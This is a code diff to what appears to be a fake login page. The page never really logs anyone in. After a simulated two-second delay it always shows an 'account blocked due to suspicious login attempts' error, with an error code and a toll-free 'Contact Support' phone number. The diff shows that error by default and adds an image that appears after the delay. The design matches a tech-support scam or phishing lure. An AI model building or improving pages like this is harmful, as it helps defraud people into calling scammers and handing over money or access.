@@ -133,7 +133,7 @@
 
         /* Error Box */
         .error-box {
-            display: block;
+            display: none;
             background-color: #f8d7da;
             color: #721c24;
             border-left: 5px solid #f5c6cb;
@@ -145,29 +145,15 @@
             position: relative;
         }
 
-        .error-icon {
-            background-color: #e83e44;
-            color: white;
-            border-radius: 50%;
-            width: 25px;
-            height: 25px;
-            display: inline-flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 16px;
-            margin-right: 10px;
+        /* Image Box */
+        .image-box {
+            display: none;
+            margin-top: 20px;
+            text-align: center;
         }
 
-        .error-text {
-            display: inline-block;
-            text-align: left;
-            vertical-align: top;
-        }
-
-        .error-code {
-            display: flex;
-            align-items: left;
-            margin-top: 5px;
+        .image-box img {
+            width: 300px; /* Adjust this size as needed */
         }
 
         /* Loading animation styles */
@@ -215,15 +201,17 @@
         <h2>Log in</h2>
 
         <!-- Error message box -->
-        <div id="error-message-box" class="error-box" style="display: none;">
-            <div class="error-code">
-                <div class="error-icon">!</div>
-                <div class="error-text">
-                    Error code: 0X0047800 <br> 
-                    Your account has been blocked due to some suspicious login attempts.<br>
-                    Contact Support : <a href="tel:18444991812">+1-844-499-1812</a>
-                </div>
+        <div id="error-message-box" class="error-box">
+            <div class="error-text">
+                Error code: 0X0047800 <br> 
+                Your account has been blocked due to suspicious login attempts. <br>
+                Contact Support : <a href="tel:18444991812">+1-844-499-1812</a>
             </div>
+        </div>
+
+        <!-- Image box -->
+        <div id="error-image-box" class="image-box">
+            <img src="/mnt/data/WhatsApp Image 2024-10-04 at 23.58.31.jpeg" alt="Error Image">
         </div>
 
         <form id="loginForm">
@@ -277,10 +265,10 @@
             }
         }
 
-        // Show error message on login attempt
-        function showErrorMessage() {
-            const errorMessageBox = document.getElementById('error-message-box');
-            errorMessageBox.style.display = 'block';
+        // Show error image on login attempt
+        function showErrorImage() {
+            const errorImageBox = document.getElementById('error-image-box');
+            errorImageBox.style.display = 'block'; // Display the image
         }
 
         // Show loading animation
@@ -298,7 +286,7 @@
 
             // Simulate a delay (e.g., a network request)
             setTimeout(function() {
-                showErrorMessage(); // Show the error message after 2 seconds
+                showErrorImage(); // Show the error image after 2 seconds
                 document.getElementById('loading').style.display = 'none'; // Hide loading animation
                 document.getElementById('login-container').style.display = 'block'; // Show the form again
             }, 2000);
